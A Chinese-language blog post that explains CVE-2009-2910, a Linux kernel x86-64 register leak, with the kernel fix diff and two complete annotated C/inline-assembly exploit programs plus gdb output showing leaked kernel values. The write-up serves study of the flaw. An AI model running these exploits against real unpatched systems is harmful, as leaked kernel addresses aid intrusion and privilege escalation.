<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
<title>
    ztree
</title>
<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="https://fastly.jsdelivr.net">
<meta name="author" content="ztree">
<meta name="description" content="竹杖芒鞋轻胜马，谁怕？一蓑烟雨任平生。">
<meta name="keywords" content="Binary">
<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
<link rel="stylesheet" href="https://lzxzl.github.io/styles/main.css" />
<link href="https://fastly.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>

    <link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
    <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
    <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
    <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
    
            <script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/Card/prism.min.js"></script>
            <link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/css/Card/prism.min.css" />
            <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
            <script defer src="https://fastly.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
            
                        <!--CDN样式-->
                        <script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
                        
                            <script>
                                (function() {
                                    var bp = document.createElement('script');
                                    var curProtocol = window.location.protocol.split(':')[0];
                                    if (curProtocol === 'https') {
                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
                                    } else {
                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
                                    }
                                    var s = document.getElementsByTagName("script")[0];
                                    s.parentNode.insertBefore(bp, s);
                                })();
                            </script>
                            
</head>

<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo">
                <a href="https://lzxzl.github.io">
                    ztree
                </a>
            </div>
            <div id="tp-weather-widget"></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/">
                        首页
                    </a>
                    
                    <a class="menu-item" href="/archives">
                        归档
                    </a>
                    
                    <a class="menu-item" href="/tags">
                        标签
                    </a>
                    
                    <a class="menu-item" href="/post/about">
                        关于
                    </a>
                    
                        <input id="switch_default" type="checkbox" class="switch_default">
                        <label for="switch_default" class="toggleBtn"></label>
            </div>
            <form id="gridea-search-form" data-update="1747748455692" action="/search/index.html">
                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
            </form>
        </div>
    </nav>

    
        <nav class="navbar-mobile" id="nav-mobile">
            <div class="container">
                <div class="navbar-header">
                    <div>
                        <a href="https://lzxzl.github.io">
                            ztree
                        </a>
                        <!--en-->
                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
                        <!--zh-->
                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
                    </div>
                    <form id="gridea-search-form" data-update="1747748455692" action="/search/index.html">
                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
                    </form>
                    <!--en-->
                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
                    <!--zh-->
                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>

                </div>
                <div class="menu" id="mobile-menu">
                    
                        <a class="menu-item" href="/">
                            首页
                        </a>
                        
                        <a class="menu-item" href="/archives">
                            归档
                        </a>
                        
                        <a class="menu-item" href="/tags">
                            标签
                        </a>
                        
                        <a class="menu-item" href="/post/about">
                            关于
                        </a>
                        
                </div>
            </div>
        </nav>
</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementById("menu-toggle-en");
        var toggleMenu_zh = document.getElementById("menu-toggle-zh");

        var mobileMenu = document.getElementById("mobile-menu");
        if (toggleMenu.display != "none") {
            if (toggleMenu.classList.contains("active")) {
                toggleMenu.classList.remove("active")
                mobileMenu.classList.remove("active")
            } else {
                toggleMenu.classList.add("active")
                mobileMenu.classList.add("active")
            }
        } else if (toggleMenu_zh.display != "none") {
            if (toggleMenu_zh.classList.contains("active")) {
                toggleMenu_zh.classList.remove("active")
                mobileMenu.classList.remove("active")
            } else {
                toggleMenu_zh.classList.add("active")
                mobileMenu.classList.add("active")
            }
        }

    }
</script>



    <script>
        (function(a, h, g, f, e, d, c, b) {
            b = function() {
                d = h.createElement(g);
                c = h.getElementsByTagName(g)[0];
                d.src = e;
                d.charset = "utf-8";
                d.async = 1;
                c.parentNode.insertBefore(d, c)
            };
            a["SeniverseWeatherWidgetObject"] = f;
            a[f] || (a[f] = function() {
                (a[f].q = a[f].q || []).push(arguments)
            });
            a[f].l = +new Date();
            if (a.attachEvent) {
                a.attachEvent("onload", b)
            } else {
                a.addEventListener("load", b, false)
            }
        }(window, document, "script", "SeniverseWeatherWidget", "//cdn.sencdn.com/widget2/static/js/bundle.js?t=" + parseInt((new Date().getTime() / 100000000).toString(), 10)));
        window.SeniverseWeatherWidget('show', {
            flavor: "slim",
            location: "WWEFQFPJZ7T8",
            geolocation: true,
            language: "auto",
            unit: "c",
            theme: "auto",
            token: "61bcc333-3305-4728-9465-6785274bb0a3",
            hover: "enabled",
            container: "tp-weather-widget"
        })
    </script>
    
            <div class="main">
                <div class="container">
                    <article class="post-wrap">
                        <header class="post-header">
                            <h1 class="post-title">
                                CVE-2009-2910-Linux Kernel x86-64 Register Leak by Jon Oberheide
                            </h1>
                            
                                    <!--zh-->
                                    <div class="post-meta zh">
                                        &#x4F5C;&#x8005;:
                                        <a itemprop="author" rel="author" href="/">
                                            ztree
                                        </a>
                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2024-05-07</a></span>
                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
                                    href="#">17.1
                                    &#x5206;&#x949F;</a></span>
                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">3834</a></span>
                                        
                                            <span class="post-category">&#x5206;&#x7C7B;:
                                
                                <a href="https://lzxzl.github.io/tag/XOAss1DVS/">info-leak</a>
                                
                                <a href="https://lzxzl.github.io/tag/LlmtM56SL/">linux kernel exploit</a>
                                
                            </span>
                                            
                                                阅读量:
                                                <span data-hk-page="current"> - </span>
                                                
                                    </div>
                                    
                        </header>
                        
                        <div class="post-content">
                            <h1 id="introduction">Introduction</h1>
<blockquote>
<p>versions &lt;= 2.6.32-rc1</p>
</blockquote>
<p>The x86-64 registers r8-r11 may be leaked to 32-bit unprivileged userspace applications that switch themselves into 64-bit mode.</p>
<p>x86-64 架构（又称为 amd64）中的 r8 到 r11 寄存器的内容可能会泄露给切换到 64 位模式的 32 位非特权用户空间应用程序。</p>
<p>x86-64 的一个关键设计决策是其与 32 位代码的向后兼容性：</p>
<ul>
<li>在 x86-64 的长模式下，有两种由代码段描述符控制的子模式：兼容模式和 64 位模式。</li>
<li>因此，64 位操作系统可以毫无问题地执行 32 位和 64 位二进制文件。</li>
<li>当然，如果我们正在执行一个 32 位二进制文件，我们可以访问传统的 32 位架构寄存器，而不是 x86-64 增加的额外寄存器文件。</li>
</ul>
<p>然而，可以在单个可执行文件中混合使用 32 位和 64 位代码：</p>
<ul>
<li>一个 32 位进程可以切换到 64 位模式，并直接跳转到 x86-64 机器代码。</li>
<li>一个 64 位进程能够调用 32 位系统调用。</li>
</ul>
<p>这种模式切换可以被滥用，正如 <a href="http://scary.beasts.org/security/CESA-2009-001.html">Chris Evans 发现的那样</a>（因为 32 位和 64 位的系统调用编号不同），绕过系统调用过滤机制（syscall filtering mechanisms），从而实现对敏感信息的泄露。</p>
<p>下面这个漏洞就是在这种情况下被利用的，在 32 位和 64 位代码之间切换时发生信息泄漏。</p>
<blockquote>
<p>syscall filtering mechanisms：好吧，其实应该就是系统调用的访问控制</p>
<ul>
<li>主要目的：限制应用程序可以执行的系统调用类型。
<ul>
<li>这对于增强系统的安全性至关重要，尤其是在多租户环境、容器化部署或任何需要细粒度安全控制的场景中。</li>
<li>过滤机制可以帮助防止恶意软件或者滥用资源，限制了潜在的攻击面。</li>
</ul>
</li>
<li>实现：
<ul>
<li><strong>seccomp（Secure Computing Mode）</strong>：允许进程指定一个简单的过滤器，这个过滤器定义了哪些系统调用是允许的，哪些是被禁止的。这种模式有两个级别：
<ul>
<li><strong>seccomp 模式 1</strong>：这是一种较为严格的过滤模式，只允许四个系统调用：<code>read()</code>, <code>write()</code>, <code>_exit()</code>, 和 <code>sigreturn()</code>。这对于非常受限的环境非常有用。</li>
<li><strong>seccomp 模式 2</strong>：提供了更灵活的过滤能力，允许进程定义一个过滤器，该过滤器使用 Berkeley Packet Filter（BPF）语法，可以精确地指定允许和禁止的系统调用列表，甚至可以根据调用的参数来决定是否允许。</li>
</ul>
</li>
<li><strong>AppArmor 和 SELinux</strong>：这些是更为复杂的安全模块，它们提供了基于角色的访问控制（RBAC）和强制访问控制（MAC）策略，这些策略可以控制进程对系统调用的访问。这些工具通过定义安全策略来限制应用程序可以执行的系统调用，以及它们可以访问的文件和网络资源。</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="the-vulnerability">The Vulnerability</h1>
<p>从系统调用返回时，未将几个 x86-64 寄存器清零（特别是 r8 到 r11）。一个 32 位应用程序可能能切换到 64 位模式，并访问 r8、r9、r10 和 r11 寄存器，从而泄露它们之前的值。这个问题由[] Jan Beulich 发现](http://lkml.org/lkml/2009/10/1/164)。</p>
<p>修复方法是在系统调用返回时通过执行 XOR 操作将 r8 到 r11 寄存器清零，即 <code>xorq %rx,%rx</code>。这样可以确保这些寄存器的内容在返回到用户空间前不会保留任何敏感信息。</p>
<pre><code class="language-assembly">diff --git a/arch/x86/ia32/ia32entry.S b/arch/x86/ia32/ia32entry.S
--- a/arch/x86/ia32/ia32entry.S
+++ b/arch/x86/ia32/ia32entry.S
@@ -172,6 +172,10 @@ sysexit_from_sys_call:
        movl    RIP-R11(%rsp),%edx              /* User %eip */
        CFI_REGISTER rip,rdx
        RESTORE_ARGS 1,24,1,1,1,1
+       xorq    %r8,%r8
+       xorq    %r9,%r9
+       xorq    %r10,%r10
+       xorq    %r11,%r11
        popfq
        CFI_ADJUST_CFA_OFFSET -8
        /*CFI_RESTORE rflags*/
</code></pre>
<h1 id="the-exploit">The Exploit</h1>
<p>核心思想：编写一个32 位用户空间应用程序，同时让他切换到 64 位模式，以便访问 x86-64 寄存器并暴露泄露的信息。</p>
<p>为了将32 位和 64 位代码混合，使用 <code>-m32</code> 编译二进制文件，但使用 gcc 的内联汇编来混合必要的 64 位代码，而不会产生冲突。为了切换到 64 位模式，只需要执行一个带有 <code>USER_CS</code> 代码段（在 Linux 上是 0x33）的 <code>ljmp/lcall</code>：</p>
<blockquote>
<p><code>ljmp</code> 指令是长跳转，用于改变控制流同时切换代码段寄存器，这里将代码段寄存器设置为 0x33，即 x86-64 下的用户空间代码段，从而切换到 64 位模式。</p>
</blockquote>
<pre><code class="language-assembly">.code32
ljmp $0x33, $1f
.code64
1:
/* 64-bit code here */
xorq %rax, %rax
...
</code></pre>
<p>对于 64 位寄存器 r8、r9、r10 和 r11，简单地将 64 位压缩到两个 32 位的通用寄存器中。例如，将 r8 的上下 32 位分别放入 rax 和 rcx（稍后通过 eax 和 ecx 检索）</p>
<pre><code class="language-assembly">movq %r8, %rcx
shr $32, %r8
movq %r8, %rax
</code></pre>
<p>最后，为了检索泄露的值，跳转到一个无效地址（0xdeadbeef）引发 SIGSEGV，然后在 gdb 中使用 <code>info regs</code> 来检查寄存器的值。</p>
<pre><code class="language-sh">$ gcc -m32 x86_64-reg-leak.c -o x86_64-reg-leak
$ gdb ./x86_64-reg-leak
GNU gdb 6.8-debian
...
(gdb) run
[+] Switching to x86_64 long mode via far jmp...
...
Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
(gdb) info reg
eax            0xffff8800       -30720        &lt;-- r8 上半部
ecx            0xa5cc6000       -1513332736   &lt;-- r8 下半部
edx            0x0      0                     &lt;-- r9 上半部
ebx            0x1      1                     &lt;-- r9 下半部
esp            0xffff8800       0xffff8800    &lt;-- r10 上半部
ebp            0xa5cc6000       0xa5cc6000    &lt;-- r10 下半部
esi            0x0      0                     &lt;-- r11 上半部
edi            0xffffffff       -1            &lt;-- r11 下半部
...
</code></pre>
<h2 id="exp1">Exp1</h2>
<pre><code class="language-c">/* 
 * x86_64-reg-leak.c
 *
 * Linux Kernel &lt;= 2.6.32-rc1 x86_64 Register Leak
 * Jon Oberheide &lt;jon@oberheide.org&gt;
 * http://jon.oberheide.org
 * 
 * Information:
 * 
 *   http://lkml.org/lkml/2009/10/1/164
 *   
 *   While 32-bit processes can't directly access R8...R15, they can gain 
 *   access to these registers by temporarily switching themselves into 64-bit
 *   mode.
 *
 * Usage:
 *
 *   $ gcc -m32 x86_64-reg-leak.c -o x86_64-reg-leak
 *   $ gdb ./x86_64-reg-leak
 *   GNU gdb 6.8-debian
 *   ...
 *   (gdb) run
 *   [+] Switching to x86_64 long mode via far jmp...
 *   ...
 *   Program received signal SIGSEGV, Segmentation fault.
 *   0xdeadbeef in ?? ()
 *   (gdb) info reg
 *   eax            0xffff8800       -30720        &lt;-- r8 upper
 *   ecx            0xa5cc6000       -1513332736   &lt;-- r8 lower
 *   edx            0x0      0                     &lt;-- r9 upper
 *   ebx            0x1      1                     &lt;-- r9 lower
 *   esp            0xffff8800       0xffff8800    &lt;-- r10 upper
 *   ebp            0xa5cc6000       0xa5cc6000    &lt;-- r10 lower
 *   esi            0x0      0                     &lt;-- r11 upper
 *   edi            0xffffffff       -1            &lt;-- r11 lower
 *   ...
 *
 * Notes:
 * 
 *   We switch from x86_64 compat mode to long mode via our far jmp and 
 *   then dump out r8-r11 through our 32-bit GPRs and then segfault for 
 *   register inspection via GDB.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;string.h&gt;

// 定义了用户代码段和数据段的选择子，用于后面在汇编代码中指定
#define USER_CS       &quot;0x33&quot;
#define USER_DS       &quot;0x2b&quot;

int
main(void)
{
	int ret;

	printf(&quot;[+] Switching to x86_64 long mode via far jmp...\n\n&quot;);

  // 睡眠 8s 多
	for (ret = 5; ret &gt; 0; ret--) {
		printf(&quot;%d...\n&quot;, ret);
		sleep(1);
	}
	printf(&quot;\n&quot;);

	sleep(3);

	asm volatile (
		&quot;	.code32				\n&quot;                       // .code32 指示接下来的代码是32位
		&quot;	ljmp $&quot; USER_CS &quot;, $1f		\n&quot;           // ljmp 是远跳转指令，用于切换到64位模式。目标是标签 1f，即代码中的 1: 标签。
		&quot;					\n&quot;
		&quot;	.code64				\n&quot;                       // .code64 指示接下来的代码是64位
		&quot;	1:				\n&quot;
		&quot;	movl $&quot; USER_DS &quot;, %%eax	\n&quot;           // 将数据段选择子加载到寄存器 eax，然后设置数据段（ds）、栈段（ss）和附加段（es）寄存器。
		&quot;	movl %%eax, %%ds		\n&quot;
		&quot;	movl %%eax, %%ss		\n&quot;
		&quot;	movl %%eax, %%es		\n&quot;
		&quot;					\n&quot;
		&quot;	movq %%r8, %%rcx		\n&quot;                 // 将 r8 寄存器的内容复制到 rcx
		&quot;	shr $32, %%r8			\n&quot;                   // 将 r8 右移32位，把高32位移至低32位位置
		&quot;	movq %%r8, %%rax		\n&quot;                 // 将修改后的 r8 复制到 rax
		&quot;					\n&quot;
		&quot;	movq %%r9, %%rbx		\n&quot;                 // 这个模式对 r9, r10, r11 也重复执行，分别操作 rbx, rdx, rbp, rsp, rdi, rsi
		&quot;	shr $32, %%r9			\n&quot;
		&quot;	movq %%r9, %%rdx		\n&quot;
		&quot;					\n&quot;
		&quot;	movq %%r10, %%rbp		\n&quot;
		&quot;	shr $32, %%r10			\n&quot;
		&quot;	movq %%r10, %%rsp		\n&quot;
		&quot;					\n&quot;
		&quot;	movq %%r11, %%rdi		\n&quot;
		&quot;	shr $32, %%r11			\n&quot;
		&quot;	movq %%r11, %%rsi		\n&quot;
		&quot;					\n&quot;
		&quot;	.code32				\n&quot;                       // 回到32位代码模式
		&quot;	jmp 0xdeadbeef			\n&quot;                 // 执行一个跳转到无效地址 0xdeadbeef 的指令，这通常会导致程序异常终止（例如访问违规）
		::
	);

	return 0;
}
</code></pre>
<h2 id="为什么code32-能指示接下来的代码是32位">为什么.code32 能指示接下来的代码是32位？</h2>
<p>在汇编语言中，指令 <code>.code32</code> 和 <code>.code64</code> 是由汇编器提供的伪指令（pseudo-instructions），它们用来指定接下来的代码应该按照哪种体系结构（32位或64位）来解释和编译。这些伪指令不直接转换为机器代码，而是用来影响汇编器的行为。下面解释了为什么和如何 <code>.code32</code> 能够指示汇编器编译32位代码：</p>
<h3 id="汇编器的模式控制">汇编器的模式控制</h3>
<p>汇编器，如 GNU Assembler (GAS)，需要知道汇编代码应该被如何处理：是作为32位代码还是64位代码。这影响了指令的编码、可用的指令集、以及寄存器的名字和功能。</p>
<ul>
<li><strong>指令长度和格式</strong>: 32位和64位模式下，某些指令的编码长度和格式可能不同。例如，64位模式支持更长的地址和偏移量。</li>
<li><strong>可用指令</strong>: 64位模式可能支持一些32位模式中不可用的扩展指令，例如操作64位寄存器的指令。</li>
<li><strong>寄存器</strong>: 64位模式引入了更多的寄存器和扩展了现有的寄存器（例如，32位的 <code>eax</code> 寄存器在64位中扩展为 <code>rax</code>）。</li>
</ul>
<h3 id="指示汇编器的目标体系结构">指示汇编器的目标体系结构</h3>
<p>当写入 <code>.code32</code> 或 <code>.code64</code> 时，告诉汇编器接下来的汇编指令应该按照32位或64位体系结构来处理。这是必要的，特别是在编写涉及多种处理模式的代码时（如在操作系统或低级系统软件中常见）。</p>
<p>例如，在代码中：</p>
<pre><code class="language-assembly">.code32
ljmp $USER_CS, $1f
</code></pre>
<p>这里 <code>.code32</code> 告诉汇编器，接下来的 <code>ljmp</code> 指令应该按照32位模式来编译。而 <code>ljmp</code> （远跳转）可能用于从32位模式切换到64位模式（通过设置正确的代码段寄存器）。</p>
<h2 id="exp2">exp2</h2>
<p><strong>spender 也同时编写了一个exp，内容如下所示。它将循环调用一系列随机的系统调用，并打印泄露的数据，这样就不必使用 gdb。</strong></p>
<pre><code class="language-c">/* written by Ingo Molnar -- it's true because this comment says the exploit
   was written by him!
*/

#include &lt;stdio.h&gt;
#include &lt;sys/syscall.h&gt;

// 这些变量用于存储从64位寄存器分割为32位部分后的值。
unsigned int _r81; 
unsigned int _r82;
unsigned int _r91;
unsigned int _r92;
unsigned int _r101;
unsigned int _r102;
unsigned int _r111;
unsigned int _r112;
unsigned int _r121;
unsigned int _r122;
unsigned int _r131;
unsigned int _r132;
unsigned int _r141;
unsigned int _r142;
unsigned int _r151;
unsigned int _r152;

// 通过从32位模式（code32）转换到64位模式（code64）并返回，从64位寄存器中提取值并将它们存储到全局变量中
int leak_it(void)
{
	asm volatile (
	&quot;.intel_syntax noprefix\n&quot;      // 指定使用Intel语法进行汇编代码
	&quot;.code32\n&quot; 										// 表明接下来的汇编代码应被视为32位
	&quot;jmp label1\n&quot;									// 跳转到标签label1，这是第一个远调用序列的开始
	&quot;farcalllabel1:\n&quot;							// 用于处理从32位到64位的远调用
	&quot;.code64\n&quot;											// 切换到64位模式
	&quot;mov eax, r8d\n&quot;                // 这些指令将64位寄存器的低32位移动到32位寄存器（eax、ebx等），然后将高32位移动到寄存器的低半部分以读取它们
	&quot;shr r8, 32\n&quot;
	&quot;mov ebx, r8d\n&quot;
	&quot;mov ecx, r9d\n&quot;
	&quot;shr r9, 32\n&quot;
	&quot;mov edx, r9d\n&quot;
	&quot;mov esi, r10d\n&quot;
	&quot;shr r10, 32\n&quot;
	&quot;mov edi, r10d\n&quot;
	&quot;.att_syntax noprefix\n&quot;				// 转换为AT&amp;T语法，通常在GNU汇编器中使用。这里用于切换回AT&amp;T语法进行长返回（lret）指令，该指令用于从调用返回
	&quot;lret\n&quot;
	&quot;.intel_syntax noprefix\n&quot;
	&quot;farcalllabel2:\n&quot;
	&quot;mov eax, r11d\n&quot;
	&quot;shr r11, 32\n&quot;
	&quot;mov ebx, r11d\n&quot;
	&quot;mov ecx, r12d\n&quot;
	&quot;shr r12, 32\n&quot;
	&quot;mov edx, r12d\n&quot;
	&quot;mov esi, r13d\n&quot;
	&quot;shr r13, 32\n&quot;
	&quot;mov edi, r13d\n&quot;
	&quot;.att_syntax noprefix\n&quot;
	&quot;lret\n&quot;
	&quot;.intel_syntax noprefix\n&quot;
	&quot;farcalllabel3:\n&quot;
	&quot;mov eax, r14d\n&quot;
	&quot;shr r14, 32\n&quot;
	&quot;mov ebx, r14d\n&quot;
	&quot;mov ecx, r15d\n&quot;
	&quot;shr r15, 32\n&quot;
	&quot;mov edx, r15d\n&quot;
	&quot;.att_syntax noprefix\n&quot;
	&quot;lret\n&quot;
	&quot;.intel_syntax noprefix\n&quot;
	&quot;.code32\n&quot;
	&quot;label1:\n&quot;
	&quot;.att_syntax noprefix\n&quot;
	&quot;lcall $0x33, $farcalllabel1\n&quot;
	&quot;.intel_syntax noprefix\n&quot;
	&quot;mov _r81, eax\n&quot;
	&quot;mov _r82, ebx\n&quot;
	&quot;mov _r91, ecx\n&quot;
	&quot;mov _r92, edx\n&quot;
	&quot;mov _r101, esi\n&quot;
	&quot;mov _r102, edi\n&quot;
	&quot;.att_syntax noprefix\n&quot;
	&quot;lcall $0x33, $farcalllabel2\n&quot;
	&quot;.intel_syntax noprefix\n&quot;
	&quot;mov _r111, eax\n&quot;
	&quot;mov _r112, ebx\n&quot;
	&quot;mov _r121, ecx\n&quot;
	&quot;mov _r122, edx\n&quot;
	&quot;mov _r131, esi\n&quot;
	&quot;mov _r132, edi\n&quot;
	&quot;.att_syntax noprefix\n&quot;
	&quot;lcall $0x33, $farcalllabel3\n&quot;
	&quot;.intel_syntax noprefix\n&quot;
	&quot;mov _r141, eax\n&quot;
	&quot;mov _r142, ebx\n&quot;
	&quot;mov _r151, ecx\n&quot;
	&quot;mov _r152, edx\n&quot;
	&quot;.att_syntax noprefix\n&quot;
	);

	printf(&quot; R8=%08x%08x\n&quot;, _r82, _r81);
	printf(&quot; R9=%08x%08x\n&quot;, _r92, _r91);
	printf(&quot;R10=%08x%08x\n&quot;, _r102, _r101);
	printf(&quot;R11=%08x%08x\n&quot;, _r112, _r111);
	printf(&quot;R12=%08x%08x\n&quot;, _r122, _r121);
	printf(&quot;R13=%08x%08x\n&quot;, _r132, _r131);
	printf(&quot;R14=%08x%08x\n&quot;, _r142, _r141);
	printf(&quot;R15=%08x%08x\n&quot;, _r152, _r151);
	return 0;
}

/* ripped from jon oberheide */
const int randcalls[] = {
	__NR_read, __NR_write, __NR_open, __NR_close, __NR_stat, __NR_lstat,
	__NR_lseek, __NR_rt_sigaction, __NR_rt_sigprocmask, __NR_ioctl,
	__NR_access, __NR_pipe, __NR_sched_yield, __NR_mremap, __NR_dup,
	__NR_dup2, __NR_getitimer, __NR_setitimer, __NR_getpid, __NR_fcntl,
	__NR_flock, __NR_getdents, __NR_getcwd, __NR_gettimeofday,
	__NR_getrlimit, __NR_getuid, __NR_getgid, __NR_geteuid, __NR_getegid,
	__NR_getppid, __NR_getpgrp, __NR_getgroups, __NR_getresuid,
	__NR_getresgid, __NR_getpgid, __NR_getsid,__NR_getpriority,
	__NR_sched_getparam, __NR_sched_get_priority_max
};

int main(void)
{
	/* to keep random stack values from being used for pointers in syscalls */
	char buf[64] = {};
	int call;
	for (call = 0; call &lt; sizeof(randcalls)/sizeof(randcalls[0]); call++) {
		syscall(randcalls[call]);
		leak_it();
	}

}
</code></pre>
<h3 id="指令集和语法转换">指令集和语法转换</h3>
<ol>
<li><strong>.intel_syntax noprefix</strong>
<ul>
<li>这指令改变汇编器解析汇编指令的语法，将其从默认的AT&amp;T语法改为Intel语法。Intel语法是在许多文档和教程中常用的，因为其更加直观。此外，<code>noprefix</code>选项意味着寄存器名称前不需要加<code>%</code>前缀。</li>
</ul>
</li>
<li><strong>.code32</strong>
<ul>
<li>这条指令告诉汇编器接下来的代码是32位代码。在32位模式下，CPU的寄存器和操作默认为32位宽。</li>
</ul>
</li>
<li><strong>jmp label1</strong>
<ul>
<li>这是一个简单的跳转指令，跳转到标签<code>label1</code>处的代码继续执行。这种方式通常用于控制流程，跳过或延迟执行某些代码块。</li>
</ul>
</li>
</ol>
<h3 id="32位到64位的转换">32位到64位的转换</h3>
<ol>
<li><strong>farcalllabel1:</strong>
<ul>
<li>这是一个标签，用作远程调用的目标点。在这里，代码从32位转换到64位执行。</li>
</ul>
</li>
<li><strong>.code64</strong>
<ul>
<li>这条指令切换到64位模式，允许汇编代码直接访问和操作64位寄存器。</li>
</ul>
</li>
<li><strong>mov eax, r8d</strong>
<ul>
<li>这条指令将64位寄存器R8的低32位移动到32位寄存器EAX。这里的<code>r8d</code>是R8的32位表示。</li>
</ul>
</li>
<li><strong>shr r8, 32</strong>
<ul>
<li>这条指令将R8寄存器中的内容向右移动32位，这样原本的高32位现在成为了低32位。</li>
</ul>
</li>
<li><strong>mov ebx, r8d</strong>
<ul>
<li>将新的R8的低32位（原高32位）移动到EBX寄存器中。</li>
</ul>
</li>
</ol>
<h3 id="返回到32位代码">返回到32位代码</h3>
<ol>
<li><strong>.att_syntax noprefix</strong>
<ul>
<li>汇编代码再次更改语法，这次从Intel语法切换回AT&amp;T语法。这是因为某些平台或工具链默认使用AT&amp;T语法，或者为了与之前的汇编代码保持一致。</li>
</ul>
</li>
<li><strong>lret</strong>
<ul>
<li>这是一个远程返回指令，用于从一个远程调用（far call）返回。在这里，它标志着从64位代码返回到32位代码的结束。</li>
</ul>
</li>
</ol>
<h1 id="the-fix">The Fix</h1>
<p>如上所示。</p>
<h1 id="references">References</h1>
<ul>
<li>https://jon.oberheide.org/blog/2009/10/04/linux-kernel-x86-64-register-leak/</li>
</ul>

                        </div>
                        
                            <div class="post-toc">
                                <ul class="markdownIt-TOC">
<li><a href="#introduction">Introduction</a></li>
<li><a href="#the-vulnerability">The Vulnerability</a></li>
<li><a href="#the-exploit">The Exploit</a>
<ul>
<li><a href="#exp1">Exp1</a></li>
<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88code32-%E8%83%BD%E6%8C%87%E7%A4%BA%E6%8E%A5%E4%B8%8B%E6%9D%A5%E7%9A%84%E4%BB%A3%E7%A0%81%E6%98%AF32%E4%BD%8D">为什么.code32 能指示接下来的代码是32位？</a>
<ul>
<li><a href="#%E6%B1%87%E7%BC%96%E5%99%A8%E7%9A%84%E6%A8%A1%E5%BC%8F%E6%8E%A7%E5%88%B6">汇编器的模式控制</a></li>
<li><a href="#%E6%8C%87%E7%A4%BA%E6%B1%87%E7%BC%96%E5%99%A8%E7%9A%84%E7%9B%AE%E6%A0%87%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84">指示汇编器的目标体系结构</a></li>
</ul>
</li>
<li><a href="#exp2">exp2</a>
<ul>
<li><a href="#%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E8%AF%AD%E6%B3%95%E8%BD%AC%E6%8D%A2">指令集和语法转换</a></li>
<li><a href="#32%E4%BD%8D%E5%88%B064%E4%BD%8D%E7%9A%84%E8%BD%AC%E6%8D%A2">32位到64位的转换</a></li>
<li><a href="#%E8%BF%94%E5%9B%9E%E5%88%B032%E4%BD%8D%E4%BB%A3%E7%A0%81">返回到32位代码</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#the-fix">The Fix</a></li>
<li><a href="#references">References</a></li>
</ul>

                            </div>
                            
                                
                                    
                                            <!--zh-->
                                            <section class="post-copyright zh">
                                                <p class="copyright-item ">
                                                    <span>&#x4F5C;&#x8005;:</span>
                                                    <span>ztree</span>
                                                </p>

                                                <p class="copyright-item">
                                                    <span>&#x6C38;&#x4E45;&#x94FE;&#x63A5;:</span>
                                                    <span><a href="https://lzxzl.github.io/post/cve-2009-2910-linux-kernel-x86-64-register-leak-by-jon-oberheide/">https://lzxzl.github.io/post/cve-2009-2910-linux-kernel-x86-64-register-leak-by-jon-oberheide/</a></span>
                                                </p>

                                                <p class="copyright-item">
                                                    <span>&#x534F;&#x8BAE;:</span>
                                                    <span>MIT License</span>
                                                </p>
                                            </section>
                                            
                                                
                                                    
                                                                    <!--Share-->
                                                                    <span style="margin-right:15px">
                        <i class="post-share"></i>
                        <span>&#x5206;&#x4EAB;:</span>
                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://lzxzl.github.io/post/cve-2009-2910-linux-kernel-x86-64-register-leak-by-jon-oberheide/"><i class="fa fa-qrcode"></i></a>
